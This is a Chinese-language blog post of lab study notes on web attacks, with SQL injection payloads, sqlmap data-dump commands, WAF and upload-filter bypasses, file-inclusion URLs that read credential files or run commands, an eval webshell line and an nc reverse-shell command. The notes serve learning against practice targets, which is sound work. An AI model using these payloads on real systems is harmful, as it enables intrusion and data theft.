<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <title>安全笔记--Web攻击技术</title>
  <meta name="description" content="2 Web攻击技术2.1 Web漏洞概述  OWASP(Opwn Web Application Security Project)          owaspbwa        注入  失效的身份认证和会话管理          Padding Oracle会话管理漏洞研究一波               ...">
  <meta name="author" content="leopardpan">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="安全笔记--Web攻击技术">
  <meta name="twitter:description" content="2 Web攻击技术2.1 Web漏洞概述  OWASP(Opwn Web Application Security Project)          owaspbwa        注入  失效的身份认证和会话管理          Padding Oracle会话管理漏洞研究一波               ...">

  <meta property="og:type" content="article">
  <meta property="og:title" content="安全笔记--Web攻击技术">
  <meta property="og:description" content="2 Web攻击技术2.1 Web漏洞概述  OWASP(Opwn Web Application Security Project)          owaspbwa        注入  失效的身份认证和会话管理          Padding Oracle会话管理漏洞研究一波               ...">

  <link rel="icon" type="image/png" href="images/favicon.png" />
  <link href="/images/favicon.png" rel="shortcut icon" type="image/png">

  <link rel="stylesheet" href="/css/main.css">
  <!-- <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet"> -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">

  <link rel="canonical" href="http://C0ldstudy.github.io/2017/11/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/">
  <link rel="alternate" type="application/rss+xml" title="Jason Xu" href="http://C0ldstudy.github.io/feed.xml">

  <!-- kramdown-math-katex latex sytax for markdown -->
  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css" integrity="sha384-yFRtMMDnQtDRO8rLpMIKrtPCD5jdktao2TV19YiZYWMDkUR5GQZR/NOVTdquEx1j" crossorigin="anonymous"> -->
  <!-- <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.js" integrity="sha384-9Nhn55MVVN0/4OFx7EE5kpFBPsEMZxKTCnA+4fqDmg12eCTqGi6+BB2LjY8brQxJ" crossorigin="anonymous"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script> -->


<!-- 站点统计 -->
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


<!-- google 统计 -->
   
  <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
      ga('create', 'UA-118980599-1', 'auto');
      ga('send', 'pageview');
  </script>
  

</head>

  <body>
    <span class="mobile btn-mobile-menu">
      <div class="nav_container">
         <nav class="nav-menu-item" style = "float:right">
            <i class="nav-menu-item">
              <a href="/#blog" title="" class="blog-button">
                Homepage
              </a>
            </i>
            
                <i class="nav-menu-item">
                  <a href="/timeline" title="timeline" class="btn-mobile-menu__icon">
                      Timeline
                  </a>
                </i>
            
                <i class="nav-menu-item">
                  <a href="/tags" title="tags" class="btn-mobile-menu__icon">
                      Tag
                  </a>
                </i>
            
                <i class="nav-menu-item">
                  <a href="/photography" title="photography" class="btn-mobile-menu__icon">
                      Photography
                  </a>
                </i>
            
                <i class="nav-menu-item">
                  <a href="/about" title="about" class="btn-mobile-menu__icon">
                      About me
                  </a>
                </i>
            
          </nav>
      </div>
    </span>




    <header class="panel-cover panel-cover--collapsed" style="background-image: url('/images/background-cover.jpg')">
  <div class="panel-main">

    <div class="panel-main__inner panel-inverted">
    <div class="panel-main__content">
        <!-- 头像效果-start -->
        <div class="ih-item circle effect right_to_left">
            <a href="/#blog" title="前往 Jason Xu 的主页" class="blog-button">
                <div class="img"><img src="/images/avatar.jpg" alt="img"></div>
                <div class="info">
                    <div class="info-back">
                        <h2>
                            
                                C0ldstudy
                            
                        </h2>
                        <p>
                           
                                Machine Learning / Security
                            
                        </p>
                    </div>
                </div>
            </a>
        </div>
        <!-- 头像效果-end -->
        <h1 class="panel-cover__title panel-title"><a href="/#blog" title="link to homepage for Jason Xu" class="blog-button">Jason Xu</a></h1>
        
        <span class="panel-cover__subtitle panel-subtitle">Personal Station</span>
        
        <hr class="panel-cover__divider" />
        <p class="panel-cover__description">In the end, we only regret the chances we didn't take.</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary" />
        
        <p class="panel-cover__description">🇨🇳Shanghai -> 🇭🇰Hong Kong -> 🇺🇸Irvine</p>
        


        <div class="navigation-wrapper">
          <div>
            <nav class="cover-navigation cover-navigation--primary">
              <ul class="navigation">
                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">Homepage</a></li>
                
                  <li class="navigation__item"><a href="/timeline" title="timeline">Timeline</a></li>
                
                  <li class="navigation__item"><a href="/tags" title="tags">Tag</a></li>
                
                  <li class="navigation__item"><a href="/photography" title="photography">Photography</a></li>
                
                  <li class="navigation__item"><a href="/about" title="about">About me</a></li>
                
              </ul>
            </nav>
          </div>
        </div>


        </div>
      </div>
    </div>

    
    <div class="panel-cover--overlay cover-clear"></div>
    
  </div>
</header>


    <div class="content-wrapper">
        <div class="content-wrapper__inner">
            


<article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
  <header class="post-header">
    <h1 class="post-title">安全笔记--Web攻击技术</h1>
    <div class="post-meta">
      <img src="/images/calendar.png" width="20px"/>
      <time datetime="2017-11-11 00:00:00 -0800" itemprop="datePublished" class="post-meta__date date">2017-11-11 | </time>
      <span id="busuanzi_container_page_pv" style='display:none'> Read: <span id="busuanzi_value_page_pv"></span> Times</span>

    </div>
  </header>

  <section class="post">

    <h3 id="2-web攻击技术">2 Web攻击技术</h3>
<h4 id="21-web漏洞概述">2.1 Web漏洞概述</h4>

<ul>
  <li>OWASP(Opwn Web Application Security Project)
    <ul>
      <li>owaspbwa</li>
    </ul>
  </li>
  <li>注入</li>
  <li>失效的身份认证和会话管理
    <ul>
      <li>Padding Oracle会话管理漏洞<strong><em>研究一波</em></strong>
        <ul>
          <li>对称加密 + CBC</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>跨站脚本（XSS）</li>
  <li>失效的访问控制</li>
  <li>敏感信息泄露</li>
  <li>攻击检测防范和不足</li>
  <li>跨站请求伪造（CSFR）</li>
</ul>

<h4 id="22-web服务器的探测">2.2 Web服务器的探测</h4>

<ul>
  <li>WAF探测web application firewall
    <ul>
      <li>nmap的waf探测脚本
        <ul>
          <li>nmap -p 80 –script http-waf-detect.nse www.xxx.com</li>
        </ul>
      </li>
      <li>wafw00f
        <ul>
          <li>waf00f www.xxx.com</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Web服务器负载均衡探测
    <ul>
      <li>CDN（content distribution network）内容分发网站</li>
      <li>Cloudflare 一台服务器数据传到CDN厂商的各个节点，用户访问各个Cloudflare节点</li>
      <li>lbd www.xxx.com	负载均衡探测</li>
    </ul>
  </li>
  <li>Web页面爬取
    <ul>
      <li>Dirbuster 网站目录和文件的遍历和猜解
        <ul>
          <li>字典位置： /usr/share/dirbuster/wordlists/</li>
        </ul>
      </li>
      <li>httrack网站镜像/克隆</li>
      <li>vbscan		探测vBulletin及其漏洞</li>
      <li>vane/wpscan 探测Wordpress及其漏洞</li>
      <li>joomscan 探测joomla及其漏洞</li>
    </ul>
  </li>
</ul>

<h4 id="23-针对web脚本的攻击">2.3 针对Web脚本的攻击</h4>

<ul>
  <li>SQL注入漏洞攻击
    <ul>
      <li>Bricks
        <ul>
          <li>第一题
            <ul>
              <li><code class="language-plaintext highlighter-rouge">'or'1'='1</code></li>
              <li><code class="language-plaintext highlighter-rouge">'or'1</code></li>
              <li>如果不能输入单引号
                <ul>
                  <li>用户名：\</li>
                  <li>密码：<code class="language-plaintext highlighter-rouge"> or 1#</code></li>
                </ul>
              </li>
            </ul>
          </li>
          <li>第二题（js查看网页源代码，js多了一道检测输入特殊字符的函数，需要绕过）
            <ul>
              <li>function onSubmitOfLoginForm(…)</li>
              <li>1.覆盖原函数(检查-console-可以覆盖原先的函数)
                <ul>
                  <li>function onSubmitOfLoginForm (){ return true;}</li>
                </ul>
              </li>
              <li>2.定义函数永远返回true</li>
              <li>3.输入万能密码即可</li>
              <li>4.禁用js中的执行</li>
            </ul>
          </li>
          <li>第三题
            <ul>
              <li><code class="language-plaintext highlighter-rouge">1')or('1=1</code></li>
              <li><code class="language-plaintext highlighter-rouge">SELECT * FROM users WHERE name=('1')or('1=1') and password=('1')or('1=1') LIMIT 0,1</code></li>
            </ul>
          </li>
          <li>第四题
            <ul>
              <li>双引号</li>
            </ul>
          </li>
          <li>第五题
            <ul>
              <li><code class="language-plaintext highlighter-rouge">'or'1'#</code> or <code class="language-plaintext highlighter-rouge">'or'1'-- </code></li>
              <li><code class="language-plaintext highlighter-rouge">#</code>注释之后的sql语句</li>
              <li>微软数据库注释符 <code class="language-plaintext highlighter-rouge">--</code> + <code class="language-plaintext highlighter-rouge">空格</code></li>
              <li>md5散列（128bit 16byte 32ascii字符）</li>
              <li>sha1（160bit 20byte 40ascii）</li>
              <li>sha256（256bit 32byte 64ascii）</li>
            </ul>
          </li>
          <li>http://www.wechall.net/ 题库</li>
          <li>第六题
            <ul>
              <li>重定向</li>
            </ul>
          </li>
          <li>第七题
            <ul>
              <li>先匹配用户名，在查询比对密码</li>
              <li>用户名：<code class="language-plaintext highlighter-rouge">'and 0 union select md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1')#</code></li>
              <li>密码：1</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>mysql常用语句
        <ul>
          <li>select version();</li>
          <li>select database();</li>
          <li>select user();</li>
          <li>show databases;</li>
          <li>use mysql;</li>
          <li>show tables;</li>
          <li>desc user;	//描述user表</li>
          <li>select Host,User,Password from user;</li>
          <li>select Host,User,Password from user where User=’root’ and 1;</li>
          <li>select Host,User,Password from user where User=’root’ and 0 union select 1,2,3;   //让左边记录为空，控制右边的返回值</li>
          <li>select Host,User,Password from user where User=’’ and 0 union select 1,2,md5(‘1’);
            <ul>
              <li>用户名与sql语句合并，让原本sql语句为0，用select语句使每一列都是md5(‘1’)的值，然后在密码输入1，即可匹配，登录成功。</li>
              <li>先做and再做or</li>
              <li>库名表名区分大小写，列名不区分大小写</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>wordpress靶机漏洞
    <ul>
      <li>wpscan –url http://192.168.80.240/wordpress – enumerate p</li>
      <li>/vane/vane.rb –url http://192.168.80.240/wordpress –enumerate p
        <ul>
          <li>data/plugins.txt</li>
        </ul>
      </li>
      <li>select * from xxx where ss_id=1 and 0 union select 1,version(),user(),database()#</li>
      <li>%27-&gt;<code class="language-plaintext highlighter-rouge">'</code>,%25-&gt;<code class="language-plaintext highlighter-rouge">%</code>,%5C-&gt;<code class="language-plaintext highlighter-rouge">\</code></li>
      <li>验证是否存在漏洞：http://192.168.80.240/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 and 1=2</li>
      <li>使用union select联合插查询：http://192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 and 0 union select 1,group_concat(TABLE_NAME),3,4 from information_schema.TABLES where TABLE_SCHEMA=0x776F72647072657373 group by TABLE_SCHEMA #</li>
      <li>group_concat 把相同的行归并在一起</li>
    </ul>
  </li>
  <li>msyql原表注入获取信息的方法（无法获得表的名字等相关信息）
    <ul>
      <li>做一个测试，新建一个user表
        <ul>
          <li>create schema Test;</li>
          <li>use Test;</li>
          <li>create table users (id INT, username, password);</li>
          <li>insert into users values (1, ‘admin’);</li>
          <li>select * from users;</li>
        </ul>
      </li>
      <li>通过use information_schema;获得数据库所有表名
        <ul>
          <li>tables 包含所有表名；</li>
          <li>columns 包含所有字段名</li>
          <li>select 1,2 from dual where 0 union select TABLE_SCHEMA,group_contat(TABLE_NAME) TABLE_NAME from information_schema, TABLES  where TABLE_SCHEMA=’Test’ LIMIT 1; //获取Test数据库中的所有表名</li>
          <li>select databse(); //获取当前数据库名字</li>
          <li>select Host,User,Passoword from user \G;</li>
          <li>hex(‘wordpress’); //776F72647072657373</li>
          <li>select 776F72647072657373;</li>
        </ul>
      </li>
      <li>只适用于mysql的报错法
        <ul>
          <li>select * form user where 0 and extractvalue(1,version());</li>
          <li><code class="language-plaintext highlighter-rouge">/*!00000 payload */</code></li>
          <li>获取文件内容：http://192.168.80.240/wordpress/wp-content/plugins/wpSS/ss_handler.php?ss_id=1 and 1=0 union select 1,hex(load_file(‘/var/www/wordpress/wp-config.php’)),3,4–</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>盲注sql注入方法
    <ul>
      <li>union select</li>
      <li>error-based</li>
      <li>time-based blind</li>
      <li>猜解法-&gt;二分折半猜解法(boolean-based blind)
        <ul>
          <li>需要先判断变量长度len()</li>
          <li>192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 +
            <ul>
              <li>and ascii(substr((select user() from wp_users limit 0,1),1,1))&gt;128 //通过判断网页是否变化确定猜测是否正确</li>
              <li>and ascii(substr((select user()),1,1))=119 //user变量第一个字符是w</li>
              <li>搜索user中的第一个字符ascii应该在0-255之前，一个一个尝试</li>
              <li>找到对应方法，使用ord(‘a’)或者chr(111)</li>
              <li>方法二:如果不能直接查看网页变化，可以通过是否超过5秒来判断是否符合标准
                <ul>
                  <li>and if(ascii(substr((select user()),1,1))&gt;128,1,sleep(5))# //if第一个参数是true，直接执行，若是false，调用sleep</li>
                </ul>
              </li>
              <li>方法三：从页面返回时间判断是否完成,benchmark()性能判断函数
                <ul>
                  <li>and if(ascii(substr((select user()),1,1))&gt;118,1,benchmark(1000000,md5(0x20)))</li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>sql注入工具
    <ul>
      <li>Pangolin</li>
      <li>Hacij</li>
      <li>Safe3</li>
      <li>啊D</li>
      <li>SQLmap
        <ul>
          <li>sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 –fingerprint  //判断这个url可以用哪些方式实现注入
            <ul>
              <li>$_GET[‘id’]</li>
              <li>$_POST[‘id’]</li>
              <li>$_COOKIE[‘id’]</li>
              <li>request.get</li>
              <li>request.form</li>
              <li>request.cookie</li>
              <li>request</li>
            </ul>
          </li>
          <li>sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 –dbs //获取数据库列表</li>
          <li>sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress –tables //获取wordpress库中所有表</li>
          <li>sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress -T wp_users –column //获得表中的所有列</li>
          <li>sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress -T wp_users -C user_login,user_pass –dump //获取列中指定数据，导出数据</li>
          <li>–count //获取数据数量</li>
          <li>–start=1 –stop=5 //获取部分的数据</li>
          <li>-tamper xxx.py //装载指定payload</li>
          <li>sqlmap –purge-output		//清除缓存
            <ul>
              <li>数据缓存在/root/.sqlmap/output/<ip></ip></li>
            </ul>
          </li>
        </ul>
      </li>
      <li>绕过WAF
        <ul>
          <li>%09(tab键)代替空格</li>
          <li>%0a（换行）%0d(回车)代替空格</li>
          <li>使用括号</li>
          <li>可以使用<code class="language-plaintext highlighter-rouge">/*!00000user()*/</code>在注释中实现运行语句</li>
        </ul>
      </li>
      <li>
        <p>POST方式</p>

        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  POST /login.php HTTP/1.1
  host:xxx
  User-agent:xxx
  Accept:...
  Content-type:...
  Content-length: 30 
</code></pre></div>        </div>

        <ul>
          <li>username=xxx&amp;password=123456</li>
          <li>使用火狐temper data插件</li>
          <li>注入时是请求数据包投向的url地址</li>
          <li>sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=tt&amp;password=123456” -p username –fingerprint</li>
          <li>sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=tt&amp;password=123456” -p username –dbs</li>
          <li>sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=test&amp;password=123456” -p username -D wackopicko –tables
   	* sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=test&amp;password=123456” -p username -D wackopicko -T users –columns
   	* sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=test&amp;password=123456” -p username -D wackopicko -T users -C id,login,password –dump</li>
        </ul>
      </li>
      <li>宽字符编码绕过
        <ul>
          <li>php的addslash函数使得<code class="language-plaintext highlighter-rouge">'</code>变为<code class="language-plaintext highlighter-rouge">\'</code>，在GBK编码中，若第一个字符大于%80则默认为双字符，使用%81%27，由于addslash使得变为%81%5c%27，而%81%5c则成为一个字符，从而使得单引号避免被转义</li>
          <li>http://172.16.1.180/index.php?id=1</li>
          <li>sqlmap 使用GET方法</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h4 id="24-文件包含漏洞攻击">2.4 文件包含漏洞攻击</h4>
<ul>
  <li>定义：服务器通过脚本代码在包含文件的时候过滤不严，从而注入一段攻击者能够控制的代码。
    <ul>
      <li>“本地文件包含漏洞”， 即Local File Inclusion, LFI。</li>
      <li>如果PHP的配置选项为“all_url_include”的话，则include/require函数可以加载远程文件，这种漏洞被称为“远程文件包含漏洞”，即Remote File Inclusion, RFI。</li>
    </ul>
  </li>
  <li>本地文件包含漏洞
    <ul>
      <li>wpscan</li>
      <li>vane</li>
      <li>http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=/etc/passwd%00</li>
      <li>http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=php://filter/read=convert.base64-encode/resource=../../../../wp-config.php%00</li>
      <li>在Firefox浏览器中设置本地代理，用nc监听传递的数据包</li>
      <li>
        <p>把得到的字符串使用HackBar通过Base64解码<code class="language-plaintext highlighter-rouge">PD9waHANCi8vICoqIE15U1FMIHNldHRpbmdzICoqIC8vDQpkZWZpbmUoJ0RCX05BTUUnLCAnd29yZHByZXNzJyk7ICAgIC8vIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZQ0KZGVmaW5lKCdEQl9VU0VSJywgJ3dvcmRwcmVzcycpOyAgICAgLy8gWW91ciBNeVNRTCB1c2VybmFtZQ0KZGVmaW5lKCdEQl9QQVNTV09SRCcsICd3b3JkcHJlc3MnKTsgLy8gLi4uYW5kIHBhc3N3b3JkDQpkZWZpbmUoJ0RCX0hPU1QnLCAnbG9jYWxob3N0Jyk7ICAgIC8vIDk5JSBjaGFuY2UgeW91IHdvbid0IG5lZWQgdG8gY2hhbmdlIHRoaXMgdmFsdWUNCg0KLy8gWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2ggYSB1bmlxdWUgcHJlZml4DQokdGFibGVfcHJlZml4ICA9ICd3cF8nOyAgIC8vIE9ubHkgbnVtYmVycywgbGV0dGVycywgYW5kIHVuZGVyc2NvcmVzIHBsZWFzZSENCg0KLy8gQ2hhbmdlIHRoaXMgdG8gbG9jYWxpemUgV29yZFByZXNzLiAgQSBjb3JyZXNwb25kaW5nIE1PIGZpbGUgZm9yIHRoZQ0KLy8gY2hvc2VuIGxhbmd1YWdlIG11c3QgYmUgaW5zdGFsbGVkIHRvIHdwLWluY2x1ZGVzL2xhbmd1YWdlcy4NCi8vIEZvciBleGFtcGxlLCBpbnN0YWxsIGRlLm1vIHRvIHdwLWluY2x1ZGVzL2xhbmd1YWdlcyBhbmQgc2V0IFdQTEFORyB0byAnZGUnDQovLyB0byBlbmFibGUgR2VybWFuIGxhbmd1YWdlIHN1cHBvcnQuDQpkZWZpbmUgKCdXUExBTkcnLCAnJyk7DQoNCi8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgYmxvZ2dpbmcuICovDQoNCmRlZmluZSgnQUJTUEFUSCcsIGRpcm5hbWUoX19GSUxFX18pLicvJyk7DQpyZXF1aXJlX29uY2UoQUJTUEFUSC4nd3Atc2V0dGluZ3MucGhwJyk7DQoNCmRlZmluZSgnUkVMT0NBVEUnLHRydWUpOw0KPz4=&lt;?php</code></p>

        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>          // ** MySQL settings ** //
          define('DB_NAME', 'wordpress');    // The name of the database
          define('DB_USER', 'wordpress');     // Your MySQL username
          define('DB_PASSWORD', 'wordpress'); // ...and password
          define('DB_HOST', 'localhost');    // 99% chance you won't need to change this value

          // You can have multiple installations in one database if you give each a unique prefix 
          $table_prefix  = 'wp_';   // Only numbers, letters, and underscores please!
          // Change this to localize WordPress.  A corresponding MO file for the	
          // chosen language must be installed to wp-includes/languages.
          // For example, install de.mo to wp-includes/languages and set WPLANG to 'de'
          // to enable German language support.
          define ('WPLANG', '');

          /* That's all, stop editing! Happy blogging. */

          define('ABSPATH', dirname(__FILE__).'/');
          require_once(ABSPATH.'wp-settings.php');

          define('RELOCATE',true);
          ?&gt;
</code></pre></div>        </div>
      </li>
      <li>远程文件包含漏洞<code class="language-plaintext highlighter-rouge">all_url_include()</code>
        <ul>
          <li>PHP中函数system\passthru\exec\exec_once可以实现执行系统命令</li>
          <li>http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=php://input%00</li>
          <li>Enable Post Data: &lt;?system(“/sbin/ifconfig”)?&gt;/&lt;?system(“uname -a”)?&gt;</li>
          <li>使用伪协议直接用get方式:http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php system(“id”);?&gt;%00</li>
          <li>把php指令经过base64编码和url编码，替换原来的</li>
          <li>http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTs%2fPg%3D%3D%00</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h5 id="25-命令注入漏洞攻击remote-command-execution-rce">2.5 命令注入漏洞攻击(Remote Command Execution, RCE)</h5>
<ul>
  <li>服务器通过脚本代码在 执行命令的时候过滤不严，从而注入一段攻击者能够 控制的代码，从而在服务器上以Web服务的后台权限 远程执行恶意指令。</li>
  <li>nslookup 加分号再加别的命令可以获取linux信息。
    <ul>
      <li>一般可以实现读写的文件
        <ul>
          <li>/tmp</li>
          <li>/sbin/ifconfig</li>
          <li>/etc/passwd</li>
          <li>/var/www</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>nc监听，连接反弹shell
    <ul>
      <li>nc 172.16.185.167 -nlp 443</li>
      <li>nc 172.16.185.167 443 -e /bin/sh</li>
      <li>dirtycow提权</li>
    </ul>
  </li>
  <li>dvwa
    <ul>
      <li>user/user</li>
      <li>源码位置： /var/www/dvwa/vulnerabilities/exec/source/</li>
      <li>`shell_command` 执行shell_command命令</li>
      <li>$(shell_command) 执行shell_command命令</li>
      <li><code class="language-plaintext highlighter-rouge">| shell_command</code> 执行shell_command命令并返回结果</li>
      <li><code class="language-plaintext highlighter-rouge">|| shell_command</code> 执行shell_command命令并返回结果</li>
      <li>; shell_command 执行shell_command命令并返回结果</li>
      <li>&amp;&amp; shell_command 执行shell_command命令并返回结果</li>
      <li><code class="language-plaintext highlighter-rouge">&gt; target_file</code> 返回结果覆盖到target_file里</li>
      <li><code class="language-plaintext highlighter-rouge">&gt;&gt; target_file</code> 返回结果追加到target_file里</li>
      <li><code class="language-plaintext highlighter-rouge">&lt; target_file</code> 把target_file的内容输入到之前的命令当中</li>
      <li>
        <ul>
          <li>operator 给目标指令添加额外的参数</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h5 id="26-文件上传漏洞攻击">2.6 文件上传漏洞攻击</h5>
<ul>
  <li>Webshell
    <ul>
      <li>大马/小马</li>
      <li>权限问题和功能问题</li>
      <li>kali：weevely</li>
    </ul>
  </li>
  <li>小马
    <ul>
      <li>CKnife</li>
      <li>蚁建</li>
      <li>altman</li>
    </ul>
  </li>
  <li>CKnife
    <ul>
      <li>ctrl+l 文件管理器输入地址</li>
      <li>解压ckinfe，到路径下，</li>
      <li>java -jar Cknife.jar运行ckinfe</li>
      <li><code class="language-plaintext highlighter-rouge">@eval(_$POST('cmd'));</code>一句话木马</li>
      <li>hackbar中postdata中输入cmd= echo hello;</li>
      <li>第一题
        <ul>
          <li>上传文件过程中，当需要检验文件格式时，若是前端检验，可以修改审查元素</li>
          <li>还可以修改文件格式，使用burpsuite抓包，在浏览器中使用本地代理，修改包的内容，改文件名</li>
          <li>之后使用Ckinfe获取服务器结构</li>
        </ul>
      </li>
      <li>第二题(MIME类型验证)
        <ul>
          <li>在burpsuite里修改文件类型为image/jpeg,然后就能避开检验</li>
          <li>image/jpeg</li>
        </ul>
      </li>
      <li>第三题（文件扩展名的黑名单验证）
        <ul>
          <li>strchr找第一个符合条件</li>
          <li>strrchr找最后一个符合条件</li>
          <li>修改可以上传文件的后缀为php3，php4，php5</li>
        </ul>
      </li>
      <li>第四题 文件内容格式验证
        <ul>
          <li>getimagesize($file_name);通过文件头部获得文件大小</li>
          <li>在木马中加入GIF89a即可绕过检测，被服务器判断是gif文件</li>
          <li>总结：改成合法类型、改成php3、改成合法的文件头</li>
        </ul>
      </li>
      <li>第五题 文件拓展名白名单验证–子目录劫持
        <ul>
          <li>篡改子目录upload/yyy.php%00/xxx.jpg	 	* 在burpsuite中修改image改成tiny.php，再把proxy-hex中找到并把php之后的一个字节改为00。</li>
        </ul>
      </li>
      <li>
        <p>文件上传漏洞攻击</p>
      </li>
      <li>
        <p>提权大杀器工具，令牌攫取漏洞 pr</p>

        <ul>
          <li>神器：熟练掌握sqlmap,nmap,burpsuite,metaspolit,setoolkit</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h5 id="27-文件上传漏洞">2.7 文件上传漏洞</h5>

<p>上传文件攻击：</p>

<h6 id="iis60解析asp漏洞">IIS6.0解析ASP漏洞</h6>

<ol>
  <li>服务器上可执行文件名为.cer.cdx.asc</li>
  <li>cer证书最后加上小马<code class="language-plaintext highlighter-rouge">@eval(_$POST('cmd'));</code>实现。</li>
  <li>在文件夹名为xxx.asp目录下，里面可以实现任意拓展名的文件都会在服务器上执行。</li>
  <li>小马的文件名设置成<code class="language-plaintext highlighter-rouge">pp.asp;.jpg</code></li>
  <li>防御方法：服务器保存文件时自己定义文件名保存，不相信用户的输入</li>
</ol>

<h6 id="nginx解析php漏洞">nginx解析php漏洞</h6>

<ol>
  <li>nginx&lt;=0.8.37,用户访问xxx.jpg/xxx.php时服务器会把xxx.jpg当做PHP文件解析</li>
</ol>

<h6 id="使用网页编辑器中的漏洞">使用网页编辑器中的漏洞</h6>

<p>IIS6解析漏洞攻击</p>

<p>fckeditor/eitor/filemanager/upload
fckeditor/eitor/filemanager/browser/default/connectors/asp/connector.asp</p>

<ul>
  <li>tamperdata查看服务器版本和类型：192.168.1.222/EditNews.html</li>
  <li>查看fckeditor版本：192.168.1.222/fckeditor/_whatsnew.html</li>
  <li>http://192.168.1.222/fckeditor/editor/filemanager/browser/default/browser.html?connector=connectors/asp/connector.asp</li>
  <li>http://192.168.1.222/fckeditor/editor/filemanager/browser/default/browser.html?connector=connectors/asp/connector.asp&amp;type=Image</li>
  <li>192.168.1.222/userfiles/image/fck.asp/littlec01dstudy.jpg</li>
  <li>直接上传littlec01dstudy.asp;.jpg文件同样可以直接运行文件内容192.168.1.222/userfiles/image/littlec01dstudy.asp;.jpg</li>
  <li>或者在如下url中使用类似方法
    <ul>
      <li>192.168.1.222/fckeditor/editor/filemanager/browser/default/connectors/test.html</li>
      <li>192.168.1.222/fckeditor/editor/filemanager/upload/test.html</li>
      <li>192.168.1.222/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Com mand=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=%2F</li>
    </ul>
  </li>
</ul>

<h5 id="28-web应用组件攻击">2.8 Web应用组件攻击</h5>

<p>Kali：</p>

<ul>
  <li>whatWeb</li>
</ul>

<h6 id="web应用服务和框架组件攻击">Web应用服务和框架组件攻击</h6>

<ol>
  <li>
    <p>Joomla3.2.1</p>

    <ul>
      <li>whatweb/zoomeye/shodan.io搜索相关信息</li>
      <li>在exploit-db.com找到相关漏洞
        <ul>
          <li>192.168.10.100/index.php/weblinks-categories?id=0 ) union select password from <code class="language-plaintext highlighter-rouge">nnla5_users</code> – )</li>
          <li>192.168.10.100/index.php/weblinks-categories?id=0 ) union select concat(0x5b,username,0x3a,password,0x5d) from nnla5_users limit 0,1 – )</li>
          <li>192.168.10.100/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60nnla5_users%60%20–%20%29</li>
